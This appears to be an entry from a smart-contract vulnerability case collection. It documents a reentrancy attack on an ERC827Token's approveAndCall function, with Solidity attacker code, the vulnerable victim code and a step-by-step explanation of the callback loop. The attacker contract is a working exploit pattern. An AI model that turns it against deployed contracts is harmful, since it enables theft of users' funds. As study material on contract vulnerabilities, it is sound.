# Attack03

### Contract Name:

ERC827Token（test745.sol）

### Contract Address:



### Transaction Count:



### Involved Ethers:



### Length of the Call Chain: 

1 external function

### Victim Function:

`approveAndCall(address,uint256,bytes)`

### Attack Mechanism:

Attack code:

```javascript
contract Attack{
    ERC827Token e = new ERC827Token();
    bytes  bs4 = new bytes(4);
    bytes4 functionSignature = bytes4(keccak256("attack()"));
    constructor() payable {}
    function prepareWork() {
        for (uint i = 0; i< bs4.length; i++){
            bs4[i] = functionSignature[i];
        }
    }
    function attack() public {
        e.approveAndCall.value(0)(this, 1 eth, bs4);
    }
    function() payable{
    }
    function getvalue() returns (uint) {
        return this.balance;
    }
}
```

Attacked code:

```javascript
contract ERC827Token is ERC827, StandardToken {

  /**
   * @dev Addition to ERC20 token methods. It allows to
   * @dev approve the transfer of value and execute a call with the sent data.
   *
   * @dev Beware that changing an allowance with this method brings the risk that
   * @dev someone may use both the old and the new allowance by unfortunate
   * @dev transaction ordering. One possible solution to mitigate this race condition
   * @dev is to first reduce the spender's allowance to 0 and set the desired value
   * @dev afterwards:
   * @dev https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
   *
   * @param _spender The address that will spend the funds.
   * @param _value The amount of tokens to be spent.
   * @param _data ABI-encoded contract call to call `_to` address.
   *
   * @return true if the call function was executed successfully
   */
  function approveAndCall(address _spender, uint256 _value, bytes _data) public payable returns (bool) {
    require(_spender != address(this));

    super.approve(_spender, _value);
    // solium-disable-next-line security/no-call-value
    require(_spender.call.value(msg.value)(_data));

    return true;
  }
  ...
```
In this case, the goal of our reentrancy is `require(_spender.call.value(msg.value)(_data));` in the victim code. To reach our goal we need pass one conditions. we need to make sure the *_spender* is not equal to `ERC827Token`'s address. 
it is too easy.Note that the `_data` parameter we passed in our attack function is called signature to ensure that we can recursively call our attack function
**Preparation.** We call `prepareWork()` function in attack code to set attack function's signature. 

**Attack.** The attacker call `attack()` function, it calls `approveAndCall` function with the parameters setted by attacker in victim contract.  The `require` condition is satisfied because we our first parameter is attacker's address. Next finally get to the key statement `require(_spender.call.value(msg.value)(_data));` which calls back to the `attack()` function in attacker's contract. Hence, a call loop is formed and we achieved a *Reentrancy* attack.